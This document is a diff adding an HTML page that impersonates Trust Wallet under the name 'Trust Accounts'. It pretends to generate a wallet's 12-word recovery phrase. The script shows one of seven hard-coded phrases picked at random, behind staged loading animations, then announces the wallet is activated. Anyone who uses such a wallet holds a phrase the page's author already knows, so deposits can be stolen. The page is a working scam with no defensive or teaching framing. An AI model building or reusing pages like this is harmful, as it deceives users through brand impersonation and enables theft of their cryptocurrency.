@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Seed Phrase | Trust Wallet</title>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<!-- Styles...start -->
+		<link rel="stylesheet" href="/style.css">
+                <link rel="stylesheet" href="/styles/seed-phrase.css">
+		<!-- Styles...end -->
+
+                <!-- Favicon...start -->
+                <link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
+                <link rel="icon" type="image/png" sizes="32x32" href="/favicon/favicon-32x32.png">
+                <link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
+                <link rel="manifest" href="/favicon/site.webmanifest">
+                <!-- Favicon...end -->
+
+		<!-- Font Import...start -->
+		<link rel="preconnect" href="https://fonts.googleapis.com">
+		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+		<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;700&display=swap" rel="stylesheet">
+		<!-- Font Import...end -->
+	</head>
+	
+	<body class="font" onload="myFunction(); display()">
+
+		<!--CSS Loader...start-->
+		<div id="spinner-wrapper">
+			<div class="spinner">
+				<div class="cube1"></div>
+				<div class="cube2"></div>
+			  </div>
+		</div>
+		<!--CSS Loader...end-->
+
+		<!--Prompt...start-->
+		<div id="wallet-wrapper">
+			<div id="wallet-activated">
+
+				<img class="check-logo" src="/images/SeekPng.com_check-png_150603.png" alt="hello" />
+				
+				<h3 class="activated-h3">Wallet Succesfully Activated</h3>
+			
+			</div>
+		</div>
+		<!--Prompt...end-->
+
+		<!-- Header...start -->
+		<header class="background-blue sizing-container">
+			<div id="container-header">
+				<a href="/index.htm" class="no-decoration">
+					<div class="logo-text">
+						<img class="trust-logo" src="/images/trust_logo.png" alt="trust-logo" />
+						<h1 class="white-text header-logo-text">Trust Accounts</h1>
+					</div>
+				</a>
+
+				<form action="/signup_process/signup.htm" method="get">
+					<button type="submit" id="disable" class="signup-btn blue-color bold-text">Create Wallet</button>
+				</form>
+			</div>
+		</header>
+		<!-- Header...end -->
+		
+		<!-- Main...start -->
+		<main>
+
+				<div class="div-container">
+					<div id="hide" class="seed-container">
+
+						<h2 class="seed-h2 center-text">Seed Phrase</h2>
+						
+						<p class="seed-para-top center-text">Do not share the current 12 word recovery phrase shown below to anyone!</p>
+
+						<div class="subdiv-container">
+
+							<div id="spin" class="spinner2">
+								<div class="rect1"></div>
+								<div class="rect2"></div>
+								<div class="rect3"></div>
+								<div class="rect4"></div>
+								<div class="rect5"></div>
+								<p class="white-text">Generating seed phrase...</p>
+							</div>
+
+							<div id="display">
+
+								<p id="txt"></p>
+
+							</div>
+
+						</div>
+						<p class="seed-para-bottom center-text italics-text">Please write down your seed somewhere accessable and avoid taking a screenshot of this page</p>
+						<button id="done-btn" onclick="showPopup()" disabled>Complete</button>
+				
+					</div>
+				</div>
+
+			
+		</main>
+		<!-- Main...end -->
+		
+		<!-- Footer...start -->
+		<footer>
+			<!-- Top Footer...start -->
+			<div class="footer-container1">
+				<div class="footer-sub-container1">
+					<div class="pad-con">
+						<h2 class="footer-header-text">Get the Trust Wallet app now!</h2>
+						
+						<p class="footer-header-paragraph">The most trusted & secure crypto wallet</p>
+					</div>
+					<div>	
+						<a href="https://apps.apple.com/app/apple-store/id1288339409?mt=8"><svg class="app-store0"></svg></a>
+						<a href="https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp&referrer=utm_source%3Dwebsite"><svg class="play-store0"></svg></a>
+						<a href="https://trustwallet.com/dl/apk"><svg class="android-download0"></svg></a>
+					</div>
+				</div>
+			</div>
+			<!-- Top Footer...end -->
+			
+			<!-- Bottom Footer...start -->
+
+			<div class="bottom-footer">
+				<a href="/index.htm" class="no-decoration">
+					<div class="logo-text">
+						<img class="trust-logo" class="logo-border" src="/images/trust_logo.png" alt="trust-logo" />
+						<h1 class="blue-color header-logo-text">Trust Accounts</h1>
+					</div>
+				</a>
+
+				<div>
+					<a href="/footers/about.htm" class="bottom-footer-link no-decoration center-text">About</a>
+					<a href="/footers/documentation.htm" class="bottom-footer-link no-decoration center-text">Documentation</a>
+					<a href="/footers/terms_of_service.htm" class="bottom-footer-link no-decoration center-text">Terms of Service</a>
+					<a href="/footers/privacy_policy.htm" class="bottom-footer-link no-decoration center-text">Privacy Policy</a>
+					<a href="/footers/support.htm" class="bottom-footer-link no-decoration center-text">Support</a>
+				</div>
+			</div>
+			<p class="copyright">Copyright &copy;2022</p>
+			<!-- Bottom Footer...start -->
+		</footer>
+		<!-- Footer...end -->
+
+		<script>
+			var myVar;
+			function myFunction() {
+				myVar = setTimeout(showPage, 2700);
+			}
+
+			function showPage() {
+				document.getElementById("spinner-wrapper").style.display = "none";
+
+				document.getElementById("disable").disabled = true;
+			}
+
+
+			//Redirects to the trust wallet app
+
+			var reDirect;
+
+			function showPopup() {
+				document.getElementById("wallet-wrapper").style.display = "block";
+				reDirect = setTimeout(blankPage, 2300);
+			}
+
+			function blankPage() {
+				window.open("blank.htm", "_top");
+			}
+
+			//Generating Seed Phrase
+
+			var one = "1.exhaust 2.quarter 3.frog 4.hockey 5.pepper 6.exotic 7.pretty 8.donor 9.health 10.saddle 11.vehicle 12.gesture";
+			var two = "1.tank 2.remember 3.wolf 4.impact 5.nature 6.blouse 7.naive 8.broccoli 9.depend 10.state 11.decorate 12.decline";
+			var three = "1.believe 2.gesture 3.decrease 4.install 5.person 6.dawn 7.beach 8.turn 9.unfair 10.divert 11.inpulse 12.same";
+			var four = "1.cost 2.tackle 3.rookie 4.dumb 5.snake 6.before 7.pack 8.image 9.exotic 10.amused 11.uniform 12.book";
+			var five = "1.auto 2.fix 3.trust 4.cram 5.announce 6.hazard 7.flash 8.comfort 9.universe 10.about 11.razor 12.link";
+			var six = "1.help 2.delay 3.wisdom 4.found 5.worth 6.guard 7.enlist 8.base 9.copy 10.puzzle 11.turtle 12.oxygen";
+			var seven = "1.enjoy 2.mail 3.earn 4.april 5.shield 6.adult 7.check 8.duck 9.raw 10.spike 11.unfair 12.luxury";
+			var eight = "empty";
+			var nine = "empty";
+			var ten = "empty";
+
+			let seed = [one,two,three,four,five,six,seven];
+
+
+
+			function display(){
+				var random = seed[Math.floor(Math.random()*seed.length)];
+				document.getElementById("txt").innerHTML = random;
+				document.getElementById("txt").style.display = "none";
+			}
+
+			function hideLoader(){
+				document.getElementById("spin").style.display ="none";
+
+			}
+
+			function showDiv(){
+				document.getElementById("display").style.display = "flex";
+				document.getElementById("display").style.transition = "all 2s";
+				document.getElementById("display").style.paddingLeft = "0.5px";
+				document.getElementById("display").style.paddingRight = "0.5px";
+			}
+
+			function divHeight(){
+				document.getElementById("display").style.height = "10rem";
+				document.getElementById("display").style.transition = "all 2s";
+			}
+
+			function divExpand(){
+				document.getElementById("display").style.width = "100%";
+				document.getElementById("display").style.transition = "all 2s";
+			}
+
+			function showTxt(){
+				document.getElementById("txt").style.display = "block";
+			}
+
+			function txtColor(){
+				document.getElementById("txt").style.color = "black";
+				document.getElementById("txt").style.transition = "all 2s";
+				document.getElementById("txt").style.opacity = "100%";
+				document.getElementById("txt").style.paddingLeft = "10px";
+				document.getElementById("txt").style.paddingRight = "10px";
+			}
+
+			function enable() {
+				document.getElementById("done-btn").disabled = false;
+			}
+
+			setTimeout(hideLoader, 6900);
+			setTimeout(showDiv, 6900);
+			setTimeout(divHeight, 7000);
+			setTimeout(divExpand, 8500);
+			setTimeout(showTxt, 9000);
+			setTimeout(txtColor, 10000);
+			setTimeout(enable, 12000);
+		</script>
+		<noscript>
+			Please enable JavaScript for the website to function properly!
+		</noscript>
+	</body>
+</html>
